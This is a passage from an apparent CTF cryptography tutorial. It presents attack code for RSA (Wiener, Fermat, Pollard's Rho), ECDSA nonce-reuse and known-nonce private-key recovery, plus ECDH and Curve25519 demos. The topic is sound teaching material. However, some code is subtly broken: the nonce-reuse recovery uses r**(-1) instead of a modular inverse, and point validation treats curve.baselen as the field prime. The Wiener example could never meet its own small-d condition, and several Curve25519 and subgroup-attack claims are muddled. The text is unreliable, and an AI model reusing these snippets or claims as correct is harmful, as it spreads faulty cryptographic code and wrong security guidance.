    result = wiener_attack(n, e)
    
    if result:
        recovered_d, recovered_p, recovered_q = result
        print(f"\n[Attack succeeded!]")
        print(f"Recovered d = {recovered_d}")
        print(f"Original d = {d}")
        print(f"Match: {recovered_d == d}")
```

#### Wiener's Attack Variants

**Variant 1: Boneh-Durfee Attack**

[Inference] The Boneh-Durfee attack extends Wiener's attack to larger private exponents (up to d < n^0.292). It uses a more sophisticated lattice-based approach:

```python
def boneh_durfee_overview():
    """
    [Inference] - Boneh-Durfee Attack overview
    Extends Wiener's attack to d < n^0.292
    Uses lattice reduction (LLL algorithm) instead of continued fractions
    """
    print("[Boneh-Durfee Attack]")
    print("Vulnerable range: d < n^0.292")
    print("Method: Lattice-based attack using LLL reduction")
    print("\nKey idea:")
    print("  From e·d ≡ 1 (mod φ(n)): e·d - 1 = k·φ(n)")
    print("  Create lattice basis from coefficients")
    print("  Apply LLL reduction to find short vectors")
    print("  Short vectors correspond to (k, d) solutions")
    print("\n[Unverified] - Full implementation requires LLL library")
    print("[Recommendation: Use existing tools (fplll, fpLLL) or online solvers]")

boneh_durfee_overview()
```

**Variant 2: Accelerated Wiener for CRT-RSA**

If CRT parameters are exposed, Wiener's attack can be accelerated:

```python
def wiener_crt_variant(n, e, dp, dq):
    """
    [Inference] - Wiener's attack variant for CRT-RSA
    If d mod (p-1) and d mod (q-1) are known/exposed:
    Can recover d more efficiently
    dp: d mod (p-1)
    dq: d mod (q-1)
    """
    print("[Wiener's Attack: CRT-RSA Variant]")
    print("[Applicable if CRT parameters (dp, dq) are exposed]")
    print("[Can recover d faster using CRT constraints]")
    print("[Feasible if d is small and CRT parameters known]")
```

#### CTF Exploitation Strategy for Wiener's Attack

1. **Check exponent size**: If both `e` and `n` are large, Wiener may not apply.
2. **Compute continued fraction**: Expand `e/n` to find convergents.
3. **Test each convergent**: Check if factors of `n` can be derived.
4. **Recover private key**: Once `d` is found, decrypt ciphertexts.
5. **Consider variants**: If attack fails, try Boneh-Durfee or other extensions.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: RSA with small private exponent

from Crypto.Util.number import getPrime, inverse
from Crypto.PublicKey import RSA

# Simulate vulnerable RSA
p = getPrime(256)
q = getPrime(256)
n = p * q
e = 65537
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# Check vulnerability
print(f"n: {n}")
print(f"e: {e}")
print(f"d: {d}")
print(f"Vulnerability check: d < n^(1/4)/3 ? {d} < {int(n**0.25/3)}")

# If vulnerable, run Wiener's attack
if d < int(n**0.25 / 3):
    print("[Vulnerable to Wiener's Attack]\n")
    
    # Execute attack code from above
    result = wiener_attack(n, e)
    
    if result:
        recovered_d, p_rec, q_rec = result
        print(f"\nVerification: recovered_d == original_d ? {recovered_d == d}")
EOF
```

---

### Fermat Factorization

Fermat Factorization exploits RSA moduli where the prime factors `p` and `q` are close together. If `|p - q|` is small, the modulus can be factored quickly by finding two squares where `n = a² - b²`.

#### Mathematical Basis

**Key Observation:**

If `n = p·q` with `p` and `q` close:

```
n = p·q = ((p+q)/2)² - ((p-q)/2)²  = a² - b²
```

Where:

```
a = (p + q) / 2
b = (p - q) / 2
```

Algorithm:

1. Start with `a = ceil(√n)`
2. Compute `b² = a² - n`
3. If `b²` is perfect square, factors found: `p = a - b`, `q = a + b`
4. Otherwise, increment `a` and repeat

#### Python Implementation

```python
def fermat_factorization(n, max_iterations=None):
    """
    Execute Fermat Factorization to factor n
    Exploits: n = p·q where |p - q| is small
    """
    print("[Fermat Factorization]")
    print(f"n = {n}")
    
    if max_iterations is None:
        max_iterations = 1000000  # Safety limit
    
    # Start with a = ceil(√n)
    a = int(n ** 0.5)
    if a * a < n:
        a += 1
    
    print(f"Starting: a = ceil(√n) = {a}")
    
    # Iterate to find b² = a² - n that is perfect square
    for iteration in range(max_iterations):
        b_squared = a * a - n
        
        # Check if b_squared is perfect square
        b = int(b_squared ** 0.5)
        
        if b * b == b_squared:
            # Factors found!
            p = a - b
            q = a + b
            
            print(f"\n[Success after {iteration + 1} iterations]")
            print(f"a = {a}, b = {b}")
            print(f"p = a - b = {p}")
            print(f"q = a + b = {q}")
            print(f"Verification: p·q = {p * q} {'==' if p * q == n else '!='} n")
            
            return p, q
        
        if iteration % 100000 == 0 and iteration > 0:
            print(f"  [{iteration} iterations... a = {a}]")
        
        a += 1
    
    print(f"[Failed to factor after {max_iterations} iterations]")
    print(f"[Likely: p and q are not close, or n is prime]")
    return None

# Example: CTF with close prime factors
if __name__ == "__main__":
    from Crypto.Util.number import getPrime
    
    print("[Fermat Factorization Example]\n")
    
    # Generate RSA with close primes (vulnerable)
    q = getPrime(512)
    p = getPrime(512)
    
    # Make p and q closer (simulate vulnerable scenario)
    p = q + 2 * getPrime(100)  # p is close to q
    
    n = p * q
    
    print(f"p = {p}")
    print(f"q = {q}")
    print(f"n = p·q = {n}")
    print(f"|p - q| = {abs(p - q)} (small = vulnerable)\n")
    
    # Execute Fermat
    factors = fermat_factorization(n)
    
    if factors:
        recovered_p, recovered_q = factors
        print(f"\n[Factorization successful!]")
        if (recovered_p == p and recovered_q == q) or (recovered_p == q and recovered_q == p):
            print("[Correct factors recovered]")
```

#### Fermat Factorization Optimization

**Optimization 1: Batch Testing**

Process multiple values of `a` at once:

```python
def fermat_factorization_optimized(n, step_size=1000):
    """
    [Inference] - Optimized Fermat using batch processing
    Test multiple 'a' values before computing square root
    """
    print("[Fermat Factorization: Optimized Version]")
    
    a = int(n ** 0.5)
    if a * a < n:
        a += 1
    
    for _ in range(1000000):
        for _ in range(step_size):
            b_squared = a * a - n
            
            # Quick check: is b_squared perfect square?
            b = int(b_squared ** 0.5)
            if b * b == b_squared:
                p = a - b
                q = a + b
                return p, q
            
            a += 1
    
    return None
```

**Optimization 2: Quadratic Sieve (for harder cases)**

[Inference] If Fermat is too slow, the Quadratic Sieve algorithm factors `n` in sub-exponential time:

```python
def quadratic_sieve_overview():
    """
    [Inference] - Quadratic Sieve overview
    More sophisticated than Fermat, faster for harder factorization
    """
    print("[Quadratic Sieve Algorithm]")
    print("Used when Fermat/trial division are too slow")
    print("Complexity: O(e^√(ln n · ln ln n)) ≈ sub-exponential")
    print("\nSteps:")
    print("  1. Find quadratic residues: x² ≡ n (mod factor_base)")
    print("  2. Build matrix of prime factorizations")
    print("  3. Find linear dependence over GF(2)")
    print("  4. Compute GCD to recover factors")
    print("\n[Unverified] - Full implementation is complex")
    print("[Tools: msieve, gmp-ecm, or online solvers]")

quadratic_sieve_overview()
```

#### CTF Exploitation Strategy for Fermat

1. **Check if `n` is a perfect square**: `√n` should not be integer.
2. **Start Fermat iteration**: Begin with `a = ceil(√n)`.
3. **Test for perfect square**: Check if `a² - n` is a perfect square.
4. **Continue iterations**: If `|p - q|` is small, factors found quickly.
5. **Fallback to other methods**: If Fermat too slow, use Pollard's Rho or Quadratic Sieve.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Factor RSA modulus with close prime factors

import math

n = 11137568879437 * 11137568879531  # Two close primes

# Fermat factorization
a = math.ceil(n ** 0.5)
print(f"Starting a = {a}\n")

for iteration in range(100000):
    b_squared = a * a - n
    b = int(b_squared ** 0.5)
    
    if b * b == b_squared:
        p = a - b
        q = a + b
        print(f"[Factored after {iteration} iterations]")
        print(f"p = {p}")
        print(f"q = {q}")
        print(f"Verification: p*q = {p*q} == n ? {p*q == n}")
        break
    
    if iteration % 10000 == 0:
        print(f"Iteration {iteration}: a = {a}")
    
    a += 1
EOF
```

---

### Pollard's Rho Factorization

Pollard's Rho is a probabilistic factorization algorithm that works well for finding small factors of `n`. It uses a pseudo-random sequence to find collisions modulo `p` (an unknown prime factor of `n`).

#### Algorithm Mechanics

**Concept:**

Generate a pseudo-random sequence `x_0, x_1, x_2, ...` modulo `n` using:

```
x_{i+1} = f(x_i) mod n  (typically f(x) = x² + c mod n)
```

If `p` divides `n`, then `x_i mod p` generates a sequence that eventually repeats (since there are only `p` values). When repetition occurs:

```
x_i ≡ x_j (mod p)  but  x_i ≢ x_j (mod n)
```

Thus: `gcd(|x_i - x_j|, n) = p` (or a multiple of p)

**Brent's Cycle Detection:**

Instead of storing all values, use cycle detection to save memory:

```python
def pollard_rho_brent(n, max_iterations=None):
    """
    Execute Pollard's Rho factorization using Brent's cycle detection
    """
    print("[Pollard's Rho Factorization (Brent's Algorithm)]")
    print(f"n = {n}")
    
    if max_iterations is None:
        max_iterations = 1000000
    
    from math import gcd
    
    # Trial small factors first
    for trial_divisor in [2, 3, 5, 7, 11, 13]:
        if n % trial_divisor == 0:
            print(f"[Small factor found: {trial_divisor}]")
            return trial_divisor, n // trial_divisor
    
    # Pollard's Rho with Brent's cycle detection
    c = 2
    attempts = 0
    
    while attempts < 5:  # Try with different c values
        attempts += 1
        
        print(f"\nAttempt {attempts}: c = {c}")
        
        x = 2
        y = 2
        d = 1
        
        # f(x) = x² + c mod n
        f = lambda x: (x * x + c) % n
        
        for iteration in range(max_iterations):
            x = f(x)
            y = f(f(y))
            d = gcd(abs(x - y), n)
            
            if d != 1:
                break
            
            if iteration % 100000 == 0 and iteration > 0:
                print(f"  [{iteration} iterations...]")
        
        if d == n:
            print(f"  [Cycle detection failed, trying different c]")
            c += 1
            continue
        
        if d > 1:
            print(f"[Success after {iteration} iterations]")
            print(f"Factor found: {d}")
            
            factor1 = d
            factor2 = n // d
            
            if factor1 * factor2 == n:
                print(f"p = {factor1}")
                print(f"q = {factor2}")
                return factor1, factor2
    
    print("[Pollard's Rho failed to find factors]")
    return None

# Example CTF scenario
if __name__ == "__main__":
    from Crypto.Util.number import getPrime
    
    print("[Pollard's Rho Example]\n")
    
    # Generate RSA with one small factor (simulating hard case)
    p = getPrime(128)  # Small factor
    q = getPrime(512)  # Large factor
    n = p * q
    
    print(f"p (small) = {p}")
    print(f"q (large) = {q}")
    print(f"n = p·q = {n}\n")
    
    # Execute Pollard's Rho
    factors = pollard_rho_brent(n)
    
    if factors:
        f1, f2 = factors
        print(f"\n[Factorization successful!]")
        print(f"Recovered factors: {f1}, {f2}")
        print(f"Verification: {f1} * {f2} == {n} ? {f1 * f2 == n}")
```

#### Pollard's Rho Optimizations

**Optimization 1: Batched GCD**

Instead of computing GCD every iteration, batch multiple steps:

```python
def pollard_rho_batched(n, batch_size=100):
    """
    [Inference] - Pollard's Rho with batched GCD computation
    Reduces GCD calls, improving performance
    """
    from math import gcd
    
    print("[Pollard's Rho: Batched GCD Version]")
    
    x = 2
    y = 2
    product = 1
    d = 1
    
    f = lambda z: (z * z + 2) % n
    
    for cycle in range(1000):
        for _ in range(batch_size):
            x = f(x)
            y = f(f(y))
            product = (product * abs(x - y)) % n
        
        d = gcd(product, n)
        
        if d != 1:
            if d < n:
                return d, n // d
            else:
                break  # Failed, restart
    
    return None

# [Unverified] - Performance improvement depends on implementation details
```

**Optimization 2: Pollard's Rho-Brent with Early Exit**

Exit early if factor found:

```python
def pollard_rho_early_exit(n):
    """
    [Inference] - Early termination upon factor discovery
    """
    print("[Pollard's Rho: Early Exit Optimization]")
    
    from math import gcd
    
    # Implementation similar to standard Pollard's Rho
    # Returns immediately upon finding factor
    # Reduces unnecessary iterations
```

#### CTF Exploitation Strategy for Pollard's Rho

1. **Check if `n` has small factors**: Trial division first (2, 3, 5, ...).
2. **Execute Pollard's Rho**: Use Brent's cycle detection for efficiency.
3. **Try multiple `c` values**: If one fails, try different polynomial.
4. **Recover RSA private key**: Once factors `p`, `q` found, compute `d = e^{-1} mod φ(n)`.
5. **Decrypt ciphertexts**: Use recovered `d` to decrypt.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Factor RSA modulus using Pollard's Rho

n = 11137568879437 * 11137568879531  # Product of two primes

print(f"RSA Modulus: {n}")
print(f"Bits: {n.bit_length()}\n")

# Quick trial division
for trial in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
    if n % trial == 0:
        print(f"[Found small factor: {trial}]")
        break

# Execute Pollard's Rho
from math import gcd

x = 2
y = 2
c = 1
d = 1
f = lambda z, c: (z * z + c) % n

for iteration in range(1000000):
    x = f(x, c)
    y = f(f(y, c), c)
    d = gcd(abs(x - y), n)
    
    if d != 1 and d != n:
        print(f"[Found factor: {d}]")
        p = d
        q = n // d
        print(f"p = {p}")
        print(f"q = {q}")
        print(f"Verification: p*q = {p*q} == n ? {p*q == n}")
        break
    
    if iteration % 100000 == 0 and iteration > 0:
        print(f"Iteration {iteration}...")
EOF
```

---

### RSA Attack Strategy Summary

|Attack|Vulnerability|Requirement|Outcome|
|---|---|---|---|
|**Common Modulus**|Shared `n` with different `e`|Multiple `(e, c)` pairs, coprime exponents|Plaintext recovery|
|**Hastad Broadcast**|Small `e`, same `m` to multiple recipients|`e ≤ k` ciphertexts, same plaintext|Plaintext recovery via CRT + e-th root|
|**Wiener**|Small `d`|`d < n^(1/4)/3`, public `(n, e)`|Private exponent and factors|
|**Fermat**|Close primes `p ≈ q`|Small `\|p-q\|`|Factorization via perfect square search|
|**Pollard's Rho**|Any modulus|General case|Probabilistic factorization, finds small factors|

##### Comprehensive CTF Workflow

```bash
# Multi-stage RSA exploitation

python3 << 'EOF'
from math import gcd
from Crypto.Util.number import isPrime, inverse

# Stage 1: Collect RSA data
rsa_data = {
    'n': 11137568879437,
    'e': 65537,
    'c': 7834657324567,
    'other_keys': [  # Check for common modulus or broadcast
        {'n': 11137568879437, 'e': 257, 'c': 2341652987654},
        {'n': 11137568879391, 'e': 65537, 'c': 5678234156789}
    ]
}

print("[RSA Attack Analysis]\n")

# Stage 2: Identify vulnerability type
n = rsa_data['n']
e = rsa_data['e']

# Check 1: Common modulus attack
print("1. Checking for Common Modulus Attack...")
shared_n_found = False
for other in rsa_data['other_keys']:
    if other['n'] == n and gcd(e, other['e']) == 1:
        print(f"  [Vulnerable: Same n, coprime exponents {e} and {other['e']}]")
        shared_n_found = True

if not shared_n_found:
    print("  [Not vulnerable to common modulus attack]")

# Check 2: Hastad Broadcast Attack
print("\n2. Checking for Hastad's Broadcast Attack...")
if e == 3 and len(rsa_data['other_keys']) >= 3:
    print(f"  [Potentially vulnerable: e={e}, {len(rsa_data['other_keys'])} ciphertexts]")

# Check 3: Wiener's Attack
print("\n3. Checking for Wiener's Attack...")
print(f"  [Requires: d < n^(1/4)/3 ≈ {int(n**0.25/3)}]")
print(f"  [Check: Is private exponent small?]")

# Check 4: Fermat Factorization
print("\n4. Checking for Fermat Factorization...")
print(f"  [Requires: |p - q| small]")
print(f"  [Attempt if other methods fail]")

# Check 5: Pollard's Rho
print("\n5. Checking for Pollard's Rho Factorization...")
print(f"  [General-purpose factorization]")
print(f"  [Always applicable if no special structure found]")

# Stage 3: Execute most promising attack
print("\n[Executing best-fit attack...]")
# Implement chosen attack based on analysis above

EOF
```

---

## Elliptic Curve Cryptography (ECC)

Elliptic curve cryptography uses algebraic structures of elliptic curves over finite fields to provide asymmetric cryptography with smaller key sizes than RSA while maintaining equivalent security. CTF challenges involving ECC exploit weak parameter selection, improper nonce generation in ECDSA, curve arithmetic vulnerabilities, and implementation flaws. [Inference] ECC attacks typically focus on discrete logarithm computation rather than factorization as in RSA.

---

### ECDSA (Elliptic Curve Digital Signature Algorithm)

ECDSA signs messages using a private key derived from elliptic curve arithmetic and verifies signatures using the corresponding public key. Signature generation requires a fresh random nonce per message; nonce reuse or predictability completely compromises the private key.

#### ECDSA Fundamentals

**Key Generation:**

- Private key: random integer `d` where `1 ≤ d < n` (n = curve order)
- Public key: point `Q = d·G` (G = generator point, scalar multiplication)
- Signature: `(r, s)` pair where `r` is x-coordinate of ephemeral point `k·G`, `s` involves message hash and nonce `k`

**Signature Generation:**

```
1. Choose random nonce k (1 ≤ k < n)
2. Compute point (x, y) = k·G
3. Set r = x mod n
4. Compute s = k⁻¹(z + r·d) mod n, where z = H(message)
5. Signature: (r, s)
```

**Signature Verification:**

```
1. Compute u₁ = z·s⁻¹ mod n, u₂ = r·s⁻¹ mod n
2. Compute (x, y) = u₁·G + u₂·Q
3. Accept if x mod n == r
```

#### Critical ECDSA Vulnerabilities in CTF

**Nonce Reuse (Same k for Two Messages):**

If identical nonce `k` signs two different messages `m₁` and `m₂`:

```
s₁ = k⁻¹(z₁ + r·d) mod n
s₂ = k⁻¹(z₂ + r·d) mod n

Both signatures share r value (same ephemeral point).
Attacker computes:
(s₁ - s₂) = k⁻¹(z₁ - z₂) mod n
k = (z₁ - z₂)·(s₁ - s₂)⁻¹ mod n

Once k known:
d = r⁻¹(s·k - z) mod n

Private key compromised.
```

**Weak or Predictable Nonce:**

If nonce derived from weak RNG or predictable sequence:

```
Known/guessed k enables immediate private key recovery:
d = r⁻¹(s·k - z) mod n
```

**Partial Nonce Exposure:**

If high-order bits of nonce leaked (through side-channel, implementation flaw):

```
[Unverified] Lattice-based attacks (LLL reduction) may recover full nonce
and subsequently private key, though complexity depends on leaked bits.
```

#### CTF Tools and Commands

**Python ECDSA Implementation (ecdsa library):**

```bash
pip install ecdsa
```

```python
from ecdsa import SigningKey, VerifyingKey, NIST256p
import hashlib

# Generate keypair
private_key = SigningKey.generate(curve=NIST256p, hashfunc=hashlib.sha256)
public_key = private_key.verifying_key

# Sign message
message = b"message to sign"
signature = private_key.sign(message, hashfunc=hashlib.sha256)
print(f"Signature (hex): {signature.hex()}")

# Verify signature
try:
    public_key.verify(signature, message, hashfunc=hashlib.sha256)
    print("Signature valid")
except:
    print("Signature invalid")

# Export/Import keys
private_pem = private_key.to_pem()
public_pem = public_key.to_pem()

# Recover private key (if you have it)
d = private_key.privkey.secret_multiplier
print(f"Private key (d): {d}")
```

**Nonce Reuse Attack (Private Key Recovery):**

```python
from ecdsa import NIST256p, SigningKey
from ecdsa.util import sigdecode_string
import hashlib

def recover_private_key_from_nonce_reuse(msg1, sig1, msg2, sig2, public_key_point):
    """
    Recover private key when same nonce k signs two messages.
    
    Both signatures must have identical r value (same ephemeral point).
    """
    # Decode signatures
    r1, s1 = int.from_bytes(sig1[:32], 'big'), int.from_bytes(sig1[32:], 'big')
    r2, s2 = int.from_bytes(sig2[:32], 'big'), int.from_bytes(sig2[32:], 'big')
    
    if r1 != r2:
        print("Different r values: signatures use different nonces")
        return None
    
    r = r1
    
    # Hash messages
    z1 = int.from_bytes(hashlib.sha256(msg1).digest(), 'big')
    z2 = int.from_bytes(hashlib.sha256(msg2).digest(), 'big')
    
    n = NIST256p.order
    
    # Recover nonce k
    k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
    print(f"Recovered nonce k: {k}")
    
    # Recover private key d
    d = (r**(-1) * (s1 * k - z1)) % n
    print(f"Recovered private key d: {d}")
    
    return d

# Usage (with known signatures and messages)
# recovered_d = recover_private_key_from_nonce_reuse(msg1, sig1, msg2, sig2, Q)
```

**Known Nonce Attack (Private Key Recovery):**

```python
from ecdsa import NIST256p
import hashlib

def recover_private_key_from_known_nonce(message, signature, nonce_k, curve=NIST256p):
    """
    Recover private key when nonce k is known (leaked/guessed).
    """
    r = int.from_bytes(signature[:32], 'big')
    s = int.from_bytes(signature[32:], 'big')
    
    z = int.from_bytes(hashlib.sha256(message).digest(), 'big')
    n = curve.order
    
    # d = r⁻¹(s·k - z) mod n
    d = (pow(r, -1, n) * (s * nonce_k - z)) % n
    
    print(f"Recovered private key d: {d}")
    return d

# If k is partially known (e.g., first 200 bits), lattice attacks apply
# [Unverified] LLL-based recovery possible but computationally intensive
```

**Curve Point Validation (Double Spend Detection):**

```python
from ecdsa import NIST256p

def verify_point_on_curve(x, y, curve=NIST256p):
    """
    Verify point (x, y) lies on elliptic curve: y² = x³ + ax + b (mod p)
    """
    p = curve.baselen  # Prime field modulus
    a = curve.curve.a()
    b = curve.curve.b()
    
    # Compute y² and x³ + ax + b
    y_squared = (y * y) % p
    rhs = (x**3 + a*x + b) % p
    
    if y_squared == rhs:
        print(f"Point ({x}, {y}) is on curve")
        return True
    else:
        print(f"Point ({x}, {y}) is NOT on curve (invalid)")
        return False

# Use for validating public keys received from untrusted sources
```

**Kali Linux: ECDSA Key Extraction from OpenSSH:**

```bash
# Extract ECDSA public key from SSH authorized_keys
ssh-keygen -l -f ~/.ssh/id_ecdsa.pub

# Convert OpenSSH format to PEM
ssh-keygen -p -N "" -m pem -f ~/.ssh/id_ecdsa

# Extract raw components
openssl pkey -in ~/.ssh/id_ecdsa -text -noout

# Extract public key for CTF verification
ssh-keygen -y -f ~/.ssh/id_ecdsa > public_key.pub
```

**Signature Forgery via Invalid Curve Attack:**

```python
def invalid_curve_point_attack():
    """
    [Unverified] If verifier doesn't validate public key lies on curve,
    attacker uses fake point to forge signatures.
    Requires custom curve implementation or misconfigured verification.
    """
    # Attacker creates point not on original curve
    # Verification succeeds if check is bypassed
    # This is primarily theoretical; production systems validate.
    pass
```

#### ECDSA Attack Priorities in CTF

1. **Check for nonce reuse:** Identical `r` values in multiple signatures → private key recovery
2. **Weak nonce generation:** Predictable nonce (sequential, PRNG seed known) → brute force `k`
3. **Known plaintext with weak hash:** Hash collisions (MD5) allow signature forgery
4. **Invalid curve points:** Public key not on curve → validation bypass possible
5. **Partially leaked nonce bits:** Lattice attacks if high-order bits known

---

### ECDH (Elliptic Curve Diffie-Hellman)

ECDH enables two parties to establish shared secret over insecure channel using elliptic curve scalar multiplication. Derived key enables symmetric encryption. CTF vulnerabilities arise from weak curve selection, shared secret derivation flaws, and key reuse.

#### ECDH Protocol

**Key Agreement:**

```
Alice:
- Generate private key a (random, 1 ≤ a < n)
- Public key: A = a·G

Bob:
- Generate private key b (random, 1 ≤ b < n)
- Public key: B = b·G

Exchange A and B over public channel.

Shared secret (both compute):
S = a·B = a·(b·G) = (a·b)·G = b·(a·G) = b·A
```

**Key Derivation:**

Shared point S = (x, y) → shared secret typically uses x-coordinate: `secret = KDF(x)`

#### ECDH Vulnerabilities

**Small Subgroup Attack:**

If curve has small cofactor (composite order), attacker forces ephemeral public key into small subgroup. [Unverified] Shared secret then lies in small subgroup, enabling brute-force key recovery.

**Weak Curve Selection:**

Curves with small embedding degree (relative to field size) vulnerable to MOV attack: discrete log reduces to multiplicative group of finite extension field (more efficient).

**Static Key Reuse:**

Same long-term keypair used for multiple sessions enables:

- Multi-session decryption recovery (if session keys predictably derived)
- Forward secrecy violation

**Invalid Curve Point Acceptance:**

If verifier doesn't validate received public key, attacker sends point not on curve. [Unverified] Verification may succeed on different curve, enabling key manipulation.

#### CTF Tools and Commands

**Python ECDH Implementation:**

```python
from ecdsa import NIST256p, SigningKey
import hashlib

def ecdh_exchange():
    """
    Simulate ECDH key agreement.
    """
    # Alice generates keypair
    alice_private = int.from_bytes(b'alice_secret_key_12345', 'big') % NIST256p.order
    alice_public = alice_private * NIST256p.generator
    
    # Bob generates keypair
    bob_private = int.from_bytes(b'bob_secret_key_12345', 'big') % NIST256p.order
    bob_public = bob_private * NIST256p.generator
    
    # Shared secret computation (both parties)
    alice_shared = alice_private * bob_public
    bob_shared = bob_private * alice_public
    
    # Verify they computed same point
    assert alice_shared == bob_shared, "Shared secrets don't match!"
    print(f"Shared secret point: {alice_shared}")
    
    # Derive symmetric key (typically x-coordinate)
    shared_x = alice_shared.x()
    symmetric_key = hashlib.sha256(str(shared_x).encode()).digest()
    print(f"Derived symmetric key (hex): {symmetric_key.hex()}")
    
    return symmetric_key

# ecdh_exchange()
```

**Small Subgroup Attack Recovery:**

```python
def small_subgroup_attack(public_key_point, cofactors):
    """
    [Unverified] If curve has small cofactor, recover bits of shared secret
    by testing subgroup membership and solving discrete log in small subgroup.
    
    Requires knowing curve's cofactor structure.
    """
    # For each small prime-order subgroup:
    # 1. Compute (cofactor * public_key) to project into subgroup
    # 2. Brute force discrete log in subgroup
    # 3. Recover corresponding bit via CRT
    
    print("[Unverified] Small subgroup attack complexity depends on cofactors")
    pass
```

**Shared Secret Derivation with KDF:**

```python
from ecdsa import NIST256p
import hashlib
import hmac

def derive_keys_from_ecdh(shared_secret_point, info=b"", salt=b""):
    """
    Derive encryption/MAC keys from ECDH shared point.
    Follows HKDF (HMAC-based KDF) structure.
    """
    # Extract x-coordinate (discard y)
    shared_x = shared_secret_point.x().to_bytes(32, 'big')
    
    # HKDF-Extract
    if not salt:
        salt = b'\x00' * 32
    prk = hmac.new(salt, shared_x, hashlib.sha256).digest()
    
    # HKDF-Expand (derive enc_key and mac_key)
    enc_key = hmac.new(prk, info + b'\x01', hashlib.sha256).digest()
    mac_key = hmac.new(prk, enc_key + b'\x02', hashlib.sha256).digest()
    
    print(f"Encryption key: {enc_key.hex()}")
    print(f"MAC key: {mac_key.hex()}")
    
    return enc_key, mac_key

# Usage:
# enc_key, mac_key = derive_keys_from_ecdh(shared_point)
```

**Kali Linux: OpenSSL ECDH Operations:**

```bash
# Generate ECDH keypair
openssl ecparam -name prime256v1 -genkey -noout -out alice_key.pem

# Extract public key
openssl ec -in alice_key.pem -pubout -out alice_pub.pem

# Perform ECDH (compute shared secret)
openssl pkeyutl -derive -inkey alice_key.pem -peerkey bob_pub.pem -out shared_secret.bin

# Display shared secret
xxd shared_secret.bin

# Derive symmetric key from shared secret
openssl dgst -sha256 shared_secret.bin
```

**Small Subgroup Detection:**

```bash
# Check curve cofactor
openssl ecparam -name prime256v1 -text -noout | grep -i "cofactor"

# Safe curves have cofactor = 1 (like secp256r1)
# Curves with cofactor > 1 vulnerable to small subgroup attacks
```

---

### Curve25519

Curve25519 is a modern elliptic curve designed by Daniel Bernstein for ECDH operations, implemented in constant-time to resist side-channel attacks. Uses 256-bit keys over prime field `p = 2²⁵⁵ - 19`. Montgomery form and cofactor structure minimize implementation pitfalls.

#### Curve25519 Security Properties

**Design Features:**

- Montgomery form: `y² = x³ + 486662x² + x`
- Prime field: `2²⁵⁵ - 19`
- Cofactor: 8 (all points have order divisible by 8)
- Simple scalar multiplication algorithm (resistant to timing attacks)

**Advantages:**

- Safer than NIST curves: side-channel resistant, simpler implementations
- Small key/ciphertext sizes
- Fast constant-time arithmetic
- No pre-computation required (unlike NIST curves)

#### Curve25519 Vulnerabilities

**[Unverified] Small Subgroup Attacks:**

Cofactor of 8 enables small subgroup attacks if input validation bypassed. Attacker forces ephemeral public key into cofactor-8 subgroup, reducing discrete log space to 8 possible values per message.

**Timing Side-Channels (Implementation-Dependent):**

Non-constant-time implementations leak information via timing. Curve25519's design mitigates but doesn't eliminate risk.

**Key Reuse Issues:**

Static keys across multiple sessions enable multi-session analysis (if shared secret derivation predictable).

#### CTF Tools and Commands

**Python Curve25519 (libsodium via PyNaCl):**

```bash
pip install pynacl
```

```python
import nacl.utils
import nacl.public
import nacl.secret
import nacl.utils

def curve25519_key_exchange():
    """
    Demonstrate Curve25519 ECDH with PyNaCl (libsodium wrapper).
    """
    # Alice generates keypair
    alice_private_key = nacl.public.PrivateKey.generate()
    alice_public_key = alice_private_key.public_key
    
    # Bob generates keypair
    bob_private_key = nacl.public.PrivateKey.generate()
    bob_public_key = bob_private_key.public_key
    
    # Compute shared secret (Alice's perspective)
    alice_box = nacl.public.Box(alice_private_key, bob_public_key)
    
    # Compute shared secret (Bob's perspective)
    bob_box = nacl.public.Box(bob_private_key, alice_public_key)
    
    # Both boxes share same secret
    print(f"Alice shared key: {alice_box.shared_key.hex()}")
    print(f"Bob shared key: {bob_box.shared_key.hex()}")
    
    # Encrypt with shared secret
    plaintext = b"Secret message"
    nonce = nacl.utils.random(nacl.public.Box.NONCE_SIZE)
    ciphertext = alice_box.encrypt(plaintext, nonce)
    
    # Decrypt (Bob uses his box)
    decrypted = bob_box.decrypt(ciphertext)
    print(f"Decrypted: {decrypted}")
    
    return alice_box, bob_box

# curve25519_key_exchange()
```

**Curve25519 in Python (cryptography library):**

```python
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import os

def x25519_key_agreement():
    """
    Direct Curve25519 (X25519) ECDH using cryptography library.
    """
    # Alice generates keypair
    alice_private = X25519PrivateKey.generate()
    alice_public = alice_private.public_key()
    
    # Bob generates keypair
    bob_private = X25519PrivateKey.generate()
    bob_public = bob_private.public_key()
    
    # Compute shared secret
    shared_secret = alice_private.exchange(bob_public)
    
    print(f"Shared secret (hex): {shared_secret.hex()}")
    
    # Derive symmetric key using HKDF
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"CTF_KEY_DERIVATION"
    )
    derived_key = hkdf.derive(shared_secret)
    print(f"Derived key: {derived_key.hex()}")
    
    return shared_secret, derived_key

# x25519_key_agreement()
```

**Cofactor-8 Small Subgroup Attack (Theoretical):**

```python
def cofactor_8_attack(session_count):
    """
    [Unverified] If multiple sessions use same long-term keypair,
    attacker can recover key by testing cofactor-8 subgroups.
    
    Requires ability to send crafted ephemeral public keys and
    observe if session succeeds (e.g., via timing, decryption success).
    """
    # Curve25519 has cofactor 8: order = 8 * prime_order
    cofactor_subgroups = 8  # 2^3
    
    # For each subgroup element (8 possibilities):
    # Send as ephemeral public key in ECDH
    # Test if decryption succeeds
    # Recover corresponding key bit via CRT
    
    print(f"[Unverified] Attack requires {cofactor_subgroups} queries per bit")
    print("Mitigation: Modern implementations perform cofactor clearing")
    pass
```

**Kali Linux: Curve25519 Operations via OpenSSL (3.0+):**

```bash
# Generate Curve25519 keypair
openssl pkey -algorithm X25519 -genkey -out alice_key.pem

# Extract public key
openssl pkey -in alice_key.pem -pubout -out alice_pub.pem

# Perform ECDH
openssl pkeyutl -derive -inkey alice_key.pem -peerkey bob_pub.pem -out shared_secret.bin

# Display shared secret
xxd shared_secret.bin
```

**Constant-Time Verification (CTF Relevance):**

```python
def constant_time_comparison(a, b):
    """
    Compare two values in constant time to resist timing attacks.
